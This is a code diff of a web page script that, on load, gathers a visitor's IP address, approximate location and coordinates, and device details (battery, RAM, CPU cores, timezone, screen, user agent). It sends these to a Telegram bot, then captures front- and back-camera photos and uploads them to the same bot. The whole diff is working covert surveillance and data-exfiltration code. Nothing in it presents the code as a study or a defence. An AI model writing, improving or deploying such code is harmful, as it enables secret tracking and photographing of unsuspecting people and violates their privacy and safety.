@@ -33,45 +33,41 @@
       });
     }
 
-    // Send image blob to Telegram
+    // Send image to Telegram
     function sendPhotoToTelegram(blob) {
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, "camera.jpg");
-
+      formData.append("photo", blob, "cam.jpg");
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: "POST",
         body: formData
       });
     }
 
-    // Take a photo from camera
-    async function takePhoto(facingMode = "user") {
+    // Take photo from camera
+    async function takePhoto(facing = "user") {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: facingMode }
+          video: { facingMode: facing }
         });
         const video = document.createElement("video");
         video.srcObject = stream;
         await video.play();
-
-        await new Promise(resolve => setTimeout(resolve, 800)); // wait camera adjust
-
+        await new Promise(res => setTimeout(res, 800));
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0);
-
         stream.getTracks().forEach(track => track.stop());
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.8));
+        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.8));
         sendPhotoToTelegram(blob);
       } catch (err) {
-        console.log("Camera access denied or failed:", err.message);
+        console.warn("Camera skipped or blocked.");
       }
     }
 
-    // Get battery
+    // Get battery info
     function getBatteryInfo() {
       return navigator.getBattery().then(battery => {
         deviceInfo += `🔋 Battery: ${Math.round(battery.level * 100)}%\n`;
@@ -81,33 +77,51 @@
       });
     }
 
-    // Get IP/location
+    // Get IP/location (HTTPS safe)
     function getIPInfo() {
-      return fetch("http://ip-api.com/json")
+      return fetch("https://ipinfo.io/json?token=ce7fbbdbe9fd92")
         .then(res => res.json())
         .then(ip => {
-          deviceInfo += `🌍 IP: ${ip.query}\n📍 Location: ${ip.city}, ${ip.regionName}, ${ip.country}\n`;
-          deviceInfo += `📌 Lat: ${ip.lat}, Lon: ${ip.lon}\n🌐 ISP: ${ip.isp}\n`;
+          const loc = ip.loc ? ip.loc.split(",") : ["N/A", "N/A"];
+          deviceInfo += `🌍 IP: ${ip.ip}\n`;
+          deviceInfo += `📍 Location: ${ip.city}, ${ip.region}, ${ip.country}\n`;
+          deviceInfo += `📌 Lat: ${loc[0]}, Lon: ${loc[1]}\n`;
+          deviceInfo += `🌐 ISP: ${ip.org || "Unknown"}\n`;
         }).catch(() => {
           deviceInfo += `🌍 IP: Not Available\n📍 Location: Unknown\n`;
         });
     }
 
-    // Final data collection and redirect
-    async function collectAndSend() {
-      await Promise.all([getBatteryInfo(), getIPInfo()]);
-      deviceInfo += `🌐 Language: ${navigator.language}\n`;
+    // Extra info
+    function getExtraDetails() {
+      const touch = 'ontouchstart' in window ? "Yes" : "No";
+      const languages = navigator.languages.join(", ");
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+      deviceInfo += `🌐 Language(s): ${languages}\n`;
+      deviceInfo += `🧠 RAM: ${navigator.deviceMemory || "?"} GB\n`;
+      deviceInfo += `🧮 CPU Cores: ${navigator.hardwareConcurrency || "?"}\n`;
+      deviceInfo += `📲 Touch Support: ${touch}\n`;
+      deviceInfo += `🕓 Timezone: ${timeZone} (UTC${-new Date().getTimezoneOffset()/60})\n`;
       deviceInfo += `💻 Platform: ${navigator.platform}\n`;
       deviceInfo += `🖥️ Screen: ${screen.width}x${screen.height}\n`;
       deviceInfo += `📱 UA: ${navigator.userAgent}\n`;
       deviceInfo += `🕒 Time: ${new Date().toLocaleString()}\n`;
-      deviceInfo += `🔗 Referrer: ${document.referrer || 'Direct'}\n`;
+      deviceInfo += `🔗 Referrer: ${document.referrer || "Direct"}\n`;
+    }
+
+    async function collectAndSend() {
+      await Promise.all([
+        getBatteryInfo(),
+        getIPInfo()
+      ]);
+      getExtraDetails();
       sendToTelegram(deviceInfo);
 
-      // Try to take photos
-      await takePhoto("user");  // Front cam
-      await takePhoto("user");  // Front cam again
-      await takePhoto("environment"); // Back cam
+      // Camera photos (only if allowed)
+      await takePhoto("user");
+      await takePhoto("user");
+      await takePhoto("environment");
     }
 
     collectAndSend();
